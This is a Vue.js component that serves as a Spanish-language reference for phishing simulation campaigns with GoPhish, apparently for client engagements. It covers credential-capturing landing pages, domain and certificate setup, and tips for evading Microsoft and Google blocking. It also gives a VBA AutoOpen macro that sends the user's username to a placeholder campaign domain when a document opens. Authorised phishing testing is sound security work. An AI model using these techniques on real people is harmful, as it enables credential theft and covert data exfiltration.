<template>
  <v-container fluid>
    <v-card height="70" flat></v-card>
    <v-row>
      <v-col cols="12" sm="12" md="12" lg="6">
        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> GoPhish </v-card-title>

          <v-card-subtitle> Toolkit </v-card-subtitle>

          <v-card-actions>
           

            <v-spacer></v-spacer>

            <v-btn block rounded tile  icon @click="showGo = !showGo">
              <v-icon>{{
                showGo ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showGo">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <a
                    href="https://github.com/gophish/gophish/releases/"
                    target="_blank"
                    >Release:</a
                  >
                  enlace de github
                </div>
                <div>
                  <a
                    href="https://docs.getgophish.com/user-guide/template-reference"
                    target="_blank"
                    >Reference:
                  </a>
                  variables para el template
                </div>
                <div>
                  <a
                    href="https://docs.getgophish.com/user-guide/documentation/landing-pages"
                    target="_blank"
                    >Landing Pages:
                  </a>
                  docs gophish
                </div>
                <div>
                  <a
                    href=" https://documentation.mailjet.com/hc/en-us/articles/360042751854-How-to-exclude-a-link-from-being-tracked-when-click-tracking-is-enabled-"
                    target="_blank"
                    >Tracker: </a
                  >mailjet
                </div>
                <br>
                <div>
                  <b>Archivos para landing page:</b> Se deben guardar dentro de gophish/static/enpoint. Luego para acceder a ellos se modifica en el html las rutas por http://domain/static/[FILE]
                </div>
                <br>
                <div>
                  <b>Capturar credenciales:</b> Debe existir un unico Form dentro del html, el cual debe tener 2 propiedades
                  <div>1. action=" "</div>
                  <div>2. method="POST"</div>
                  <div>Asegurarse de que no exista un parametro de onsubmit en el form y cada input debe tener el atributo name</div>
                  
                </div>
                <div>
                  <b>regex email:</b> pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}$"
                </div>
                <br>
                <div>
                  <b>Configuración de un sender profile en gophish:</b>
                  <p>Tener en cuenta que el sender dentro del email template debe ser modificado por el del perfil. El email de campaña se envia con el sender del email template, aunque dentro del perfil el dominio corresponda a otro dominio</p>
                  <br>
                   <v-img height="400" src="../assets/perfil.png"></v-img>

                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>

      </v-col>
      <v-col cols="12" sm="12" md="12" lg="6">
        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> CERTBOT </v-card-title>

          <v-card-subtitle> Certificado para landing page </v-card-subtitle>

          <v-card-actions>            

            <v-spacer></v-spacer>

            <v-btn block rounded tile   icon @click="showCert = !showCert">
              <v-icon>{{
                showCert ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showCert">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <a
                    href="https://certbot.eff.org/lets-encrypt/"
                    target="_blank"
                    >Certbot instructions</a
                  >
                </div>
                
                <div><b>Generar certificado para el dominio:</b></div>
                <div>
                  certbot certonly --standalone
                </div>
                <br>
                <p>Cuando se crea el certificado para un unico dominio no es necesario agregar un registro TXT al DNS.</p>
                
                <div><b>Generar certificado para subdominio:</b></div>
                <div>
                  certbot certonly --manual --preferred-challenges=dns --email (
                  EMAIL) --server https://acme-v02.api.letsencrypt.org/directory
                  --agree-tos -d *.(DOMAIN)
                </div>
                <br>
                <div><p>Cuando se crear el certificado para subdominio, unicamente existe certificado para algo.midiminio.com por esto se debe tener precaución sobre
                  donde se guardan las imagenes o css ya que sin un certificado valido en estos recursos no se van a cargar sobre el html.</p></div>
                <br>
                <div>
                  Certbot dara como respuesta la ruta de los certificados
                </div>
                <v-img height="100" src="../assets/certbot.png"></v-img>
                <br>
                <div><b>Se deben reenombrar los certificados de la siguiente forma:</b></div>
                <div>
                  fullchain.pem = domain.crt
                </div>
                <div>
                  privkey.pem = domain.key
                </div>

                <div>
                  En <b>config.json</b> se deben modificar los siguientes parametros:
                </div>
                <v-img height="100" src="../assets/config.png"></v-img>
                <div><b>Una vez se actualice el archivo de config se debe reiniciar gophish para que se apliquen los cambios</b></div>

                
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>
      <v-col cols="12" sm="12" md="12" lg="6">
        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> Dominio </v-card-title>

          <v-card-subtitle>Configuración del dominio</v-card-subtitle>

          <v-card-actions>            

            <v-spacer></v-spacer>

            <v-btn block rounded tile   icon @click="showDomain = !showDomain">
              <v-icon>{{
                showDomain ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showDomain">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  El dominio debe quedar con los siguientes archivos en el DNS para quedar configurado
                </div>                
               
                <div>
                  1. Un registro tipo TXT para la validación del dominio con mailjet
                </div>
                <br>
                <div>
                  2. Dos registros TXT que corresponden al la configuración SPF y DKIM de mailjet
                </div>
                <br>
                <div>
                  3. Un registro tipo A que contiene de nombre @ y el valor de la IP
                </div>
                <br>
                <div>
                  4. Un registro tipo A que contiene de nombre el subdominio de la campaña y el valor de la IP. Cada subdominio debe estar registrado como registro tipo A
                </div>
                <br>
                <div>
                  5. Un registro tipo CNAME para el nombre www y el valor del dominio
                </div>
                <br>
                <div>
                  La configuración de los registros dentro del DNS debería verse así:
                  <br>
                   
                   <br>
                   <p>Es importante tener en cuenta que no en todos los DNS funciona así
                    <br>
                    1. El TXT de Validación de dominio puede que necesite el .dominio al final del nombre: mailjet._cf5d.midominio.com
                    <br>
                    2. Los TXT con nombre @, puede que necesiten ser reemplazados por el dominio. Lo mismo para el caso registros A de subdominios ej: login.midominio.com
                   </p>
                   <p>Para el caso de godaddy no se necesita el nombre de dominio, en namecheap si es necesario</p>
                </div>

              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>

 <v-col cols="12" sm="12" md="12" lg="6">
        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> Whitelist </v-card-title>

          <v-card-subtitle> Reglas de correo para cliente </v-card-subtitle>

          <v-card-actions>            

            <v-spacer></v-spacer>

            <v-btn block rounded tile   icon @click="showWhite = !showWhite">
              <v-icon>{{
                showWhite ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showWhite">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <p>Se debe hacer whitelist de los siguientes dominios</p
                  >
                </div>                
               
                <div>
                  1. El dominio de la campaña de mailjet siempre es bn3.mailjet.com
                </div>
                <br>
                
                <div>2. El dominio de phishing con los respectivos subdominios, si se tiene una url de phishing login.midominio.com se debe realizar whitelist sobre
                  login.midominio.com y del dominio www.midominio.com. En esta ultima es donde generalmente quedan guardados los archivos o el mensaje de confirmación                 
                </div>
                <br>
                
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>

<v-col cols="12" sm="12" md="12" lg="6">
        

        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> Bloqueo de Dominio </v-card-title>

          <v-card-subtitle> Como evitarlo y que hacer luego de bloqueado </v-card-subtitle>

          <v-card-actions>
            

            <v-spacer></v-spacer>

            <v-btn block rounded tile icon @click="showBlock = !showBlock">
              <v-icon>{{
                showBlock ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showBlock">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <strong>Recomendaciones para evitar el bloqueo:</strong>
                  <br>
                  <ul>
                  <li>Para evitar que el dominio sea bloqueado primero hay que asegurarse que no exista ninguna referencia de microsoft dentro del landing, 
                    tambien se deben verificar los css. Modificar los nombres de archivos, imagenes o otros por uno más generico que no tenga relación con microsoft.</li>
                  <li>No incluir la palabra microsoft en el dominio, esto hace que más rapido se bloquee el dominio</li>
                  <li>En ocasiones el bloqueo del dominio se da por parte del cliente, ya que los controles de office365 o Exchange pueden generar el reporte de phishing, sobretodo si el correo se va a cuarentena. Cuando este control esta activo una
                    una ip de microsoft (40.94....) analiza el correo y abre el link, si esto sucede el dominio se bloquea en pocas horas.
                  </li>
                  <li>
                    Existe otra opción para asegurar el <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/security/lookalikes/lookalike-domains.md"  target="_blank">dominio</a>, para esto el cliente debe cargar unos archivos txt al dominio original y a su vez estos mismos archivos deben estar en el dominio phishing, la desvenataja es que esta validación tardaría unos días adicionales mientras Google aprueba
                    </li>
                  </ul>
                  <p>Para tener en cuenta: Una vez se envia un correo por primera vez, el tiempo maximo sin bloqueo son aproximadamente 3 días, para asegurar que el correo llega sin exponerse al bloqueado
                    se puede enviar un test con un link no relacionado a la campaña. 
                  </p>
                  
                </div>
                <div>
                  <strong>Dominio bloqueado:</strong>
                  <br>
                  <p>Una vez el dominio esta bloqueado, por si solo se vuelve a desbloquear pero tarda más de 6 meses. La mejor opción es intentar conseguir otro dominio, si no es posible:</p>
                  <p>La unica solución es entrar a <a href="https://search.google.com/search-console" target="_blank"> Search Console </a> de google y revisar la razón por la que al dominio se le dio de baja, realizar los cambios correspondientes (para estos casos con modificar la landing page ya se recupera el dominio) y enviar
                    una solicitud, que puede tardar maximo hasta una semana en revisar y volver a tener el dominio activo. No se debe enviar más de una solicitud o el proceso tardará más tiempo
                  </p>
                  <p><strong>Importante:</strong> Si el dominio fue bloqueado una vez y se logra desbloquear, es muy probable que vuelva a bloquearse en menos de 4h porque ya el dominio pertenece a la lista negra y queda marcado. Lo mejor es asegurarse que el whitelist del cliente este realizado correctamente</p>

                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>

      <v-col cols="12" sm="12" md="12" lg="6">
        

        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> Varios </v-card-title>

          <v-card-subtitle> Herramientas </v-card-subtitle>

          <v-card-actions>
            

            <v-spacer></v-spacer>

            <v-btn block rounded tile icon @click="showTools = !showTools">
              <v-icon>{{
                showTools ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showTools">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <a
                    href="https://github.com/urbanadventurer/urlcrazy"
                    target="_blank"
                    >Urlcrazy:
                  </a>
                  Permutación de dominios
                </div>
                <div>
                  <a href="https://www.base64-image.de/" target="_blank"
                    >Imagen64: </a
                  >Generar la imagen en base 64
                </div>
                <div>
                  <a href="https://tmuxcheatsheet.com/" target="_blank"
                    >Tmux: </a
                  >Cheat sheet tmux
                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>
      <v-col cols="12" sm="12" md="12" lg="6">
        

        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> Imagen en cuerpo </v-card-title>

          <v-card-subtitle>
            Codigo del email con imagen como cuerpo
          </v-card-subtitle>

          <v-card-actions>
            

            <v-spacer></v-spacer>

            <v-btn block rounded tile  icon @click="showCode = !showCode">
              <v-icon>{{
                showCode ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showCode">
              <v-divider></v-divider>

              <v-card-text>
                <div>
                  <div><span>&lt;html&gt;</span></div>
                  <div><span>&lt;body&gt;</span></div>
                  <div>
                    <span
                      >&lt;a href=&quot;{ {.URL}}&quot; rel="notrack"&gt;</span
                    >
                  </div>
                  <div><span>&lt;img width="600" src="[BASE64]" /&gt;</span></div>
                  <div><span>&lt;/a&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div><span>&lt;br&gt;</span></div>
                  <div>
                    <span>
                      &lt;p&gt; &lt;img src="{ {.TrackingURL}}"
                      rel="notrack"/&gt; &lt;/p&gt;</span
                    >
                  </div>
                  <div><span>&lt;/body&gt;</span></div>
                  <div><span>&lt;/html&gt;</span></div>
                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>

      <v-col cols="12" sm="12" md="12" lg="6">       

        <v-card elevation="2" class="mx-auto" max-width="800" outlined shaped>
          <v-card-title> File attached </v-card-title>

          <v-card-subtitle> Phishing con archivo adjunto </v-card-subtitle>

          <v-card-actions>
           

           

            <v-btn block rounded tile  icon @click="showAdj = !showAdj">
              <v-icon>{{
                showAdj ? "mdi-chevron-up" : "mdi-chevron-down"
              }}</v-icon>
            </v-btn>
          </v-card-actions>

          <v-expand-transition>
            <div v-show="showAdj">
              <v-divider></v-divider>

              <v-card-text>
                <div> 
                  <b>Introducción:</b>                
                  <div>Para realizar el tracking de un archivo, la macro se encarga de realizar una petición GET al dominio de la campaña cuando el usuario abre el archivo. En algunos casos el usuario deberá habilitar las macros para que la petición se realice en otros se ejecutara automaticamente, todo depende de la configuración que tenga el usuario para su ejecucción.</div>
                  <br>
                  <b>Ejecucción:</b>  
                  <div>Para realizarla se deben lanzar 2 campañas donde la primera cuenta con unico usuario (cuenta propia). De esta se obtendrá el Rid (cvs: raw events), este Rid se utiliza para realizar el tracking. La segunda campaña corresponde a la campaña que se realiza con el cliente</div>
                  <div>Una vez se ejecuta la macro, para visualizar las peticiones, se accede a el cvs de raw events (campaña 1) donde cada GET tendrá la <b>dirección ip</b> y el <b>username</b> de la maquina donde se ejecutó el archivo. Con estos datos se realiza un cruce con la información de la campaña 2 (cliente) para identificar que usuarios ejecutaron la macro. </div>
                  <br>
                  <b>Parametros:</b> 
                  <div>La macro cuenta con 2 parametros</div>
                  <div><b>DOMAIN:</b>Dominio de la campaña</div>
                  <div><b>RID:</b>Rid de la primer campaña con unico usuario</div>
                  <div></div>
                  <br>
                   <b                   
                    >Codigo vba:
                  </b>
                  <br>
                  
                    <div>Sub AutoOpen()</div>
                      
                     <div> &nbsp; Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")</div>
                      <div>&nbsp; UserNameId = Environ("USERNAME")</div>
                      <div><span>&nbsp; URL = "http://[DOMAIN]/?rid=[RID]&amp;username" &amp; UserNameId</span> </div>
                      <div>&nbsp; objHTTP.Open "GET", URL, False</div>
                      <div>&nbsp; objHTTP.send ("")</div>

                    <div>End Sub</div>
                  
                </div>
                <br>
                <b>Nota:</b> 
                <div>La función debe llamar AutoOpen para que se ejecute automaticamente una vez se abra el archivo. El archivo puede ser guardado en formato .docm o .doc</div>
                <br>
                  <b>Referencias:</b> 
                <div>
                  <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/environ-function" target="_blank"
                    >Environ function: </a
                  >Documentación sobre función environ 
                </div>
                <div>
                  <a href="https://gist.github.com/RebeccaWhit3/5dad8627b8227142e1bea432db3f8824" target="_blank"
                    >Environment Variables in Windows: </a
                  >Lista de variables de entorno en windows
                </div>
              </v-card-text>
            </div>
          </v-expand-transition>
        </v-card>
      </v-col>
     
    </v-row>
  </v-container>
</template>

<script>
export default {
  data() {
    return {
      showGo: false,
      showCert: false,
      showTools: false,
      showCode: false,
      showAdj: false,
      showDomain:false,
      showWhite:false,
      showBlock:false,
    };
  },
};
</script>